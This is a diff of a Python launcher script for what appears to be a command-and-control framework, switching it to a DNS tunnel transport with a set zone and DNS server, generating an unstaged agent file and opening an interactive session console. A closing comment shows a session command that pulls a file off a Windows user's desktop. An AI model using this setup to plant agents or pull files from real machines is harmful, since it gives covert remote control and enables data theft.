@@ -1,33 +1,35 @@
 #!/usr/bin/python3
-
-from syhelpers.log import activate_debug
+from syhandler.handler import Handler
+from syhelpers.log import activate_debug, print_message, LOGFILE
 from sycmd.handler import HandlerCmdProcessor
 
 #import os.path
 #installPath = os.path.abspath(os.path.dirname(__file__))
 #print_debug("Main", "installPath = {}".format(installPath))
 
-#activate_debug("Main")
+activate_debug("Main")
 #activate_debug("Handler")
 #activate_debug("Channel")
 #activate_debug("PlatformPowershell")
-#activate_debug("TransportDns")
+activate_debug("TransportDns")
 #activate_debug("TransportReverseTcp")
 #activate_debug("Message Parse")
 #activate_debug("Message Create")
-activate_debug("CmdHandler")
-activate_debug("CmdSession")
+#activate_debug("CmdHandler")
+#activate_debug("CmdSession")
 
-HandlerCmdProcessor().cmdloop()
+
+
+handler = Handler()
 
 #handler.setoption("PLATFORM", "POWERSHELL")
-#handler.setoption("AGENTDEBUG", "TRUE")
+handler.setoption("AGENTDEBUG", "TRUE")
 
-#handler.setoption("TRANSPORT", "DNS")
+handler.setoption("TRANSPORT", "DNS")
 #handler.setoption("AGENTTYPE", "DNSCAT2")
 #handler.setoption("AGENTTYPE", "DNSCAT2DOWNLOADER")
-#handler.setoption("ZONE", "zfs.sy.gs")
-#handler.setoption("DNSSERVER", "10.201.1.83")
+handler.setoption("ZONE", "zfs.sy.gs")
+handler.setoption("DNSSERVER", "10.201.1.83")
 #handler.setoption("DNSTYPE", "A")
 
 #handler.setoption("TRANSPORT", "REVERSETCP")
@@ -41,8 +43,11 @@ HandlerCmdProcessor().cmdloop()
 
 #handler.generatestager()
 
-#handler.setoption("STAGED", "FALSE")
-#handler.generateagent("/tmp/agentfile.txt")
+handler.setoption("STAGED", "FALSE")
+handler.generateagent("/tmp/agentfile.txt")
 
 #handler.run()
 
+HandlerCmdProcessor(handler).cmdloop()
+
+# syssspy session> download C:\Users\fsteglich\Desktop\test.txt /tmp/out.txt
